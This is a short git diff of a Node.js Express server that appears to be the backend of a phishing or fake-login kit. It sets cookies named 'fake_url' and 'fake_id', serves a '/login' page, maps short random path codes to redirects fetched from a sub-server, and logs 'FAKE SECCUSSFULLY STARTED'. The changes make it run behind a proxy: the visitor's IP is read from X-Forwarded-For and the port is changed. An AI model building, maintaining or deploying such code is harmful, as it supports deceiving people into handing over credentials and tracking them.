@@ -13,8 +13,8 @@ const app = express()
 
 //Enable read/write cookies
 app.use(cookieParser())
-
-// app.set('trust proxy', true)
+ 
+app.set('trust proxy', true)
 app.use(express.json({extended: true}))
 app.use('/login', require('./auth/login'))
 app.use(express.static(path.resolve('./auth')))
@@ -63,6 +63,7 @@ app.get(/(^\/[a-zA-Z0-9]{6,10})/, async (request, response) => {
                         //new URL(request.protocol+'://'+request.hostname).origin
                     })
                 })
+              .catch(e=>console.log(e.message))
                 let res = await fetch(process.env.SUB_SERVER_URL+'/api/get_redirect',{
                     method: 'POST',
                     headers:{
@@ -87,7 +88,7 @@ app.get(/(^\/[a-zA-Z0-9]{6,10})/, async (request, response) => {
                 response.cookie('fake_url', new URL(request.protocol+'://'+request.hostname).origin)
                 response.cookie('has_validator', redirect.validator)
                 response.cookie('id', user_id)
-                response.cookie('ip', request.ip)
+                response.cookie('ip', request.headers['x-forwarded-for'].split(',')[0])
                 response.cookie('fake_id', fake_id)
                 response.cookie('redirect', redirect.redirect)
                 response.cookie('type', process.env.SERVER_TYPE)
@@ -107,6 +108,6 @@ app.get(/(^\/[a-zA-Z0-9]{6,10})/, async (request, response) => {
     }
 })
 
-app.listen(9999, ()=>{
+app.listen(3000, ()=>{
     console.log('FAKE SECCUSSFULLY STARTED')
 })
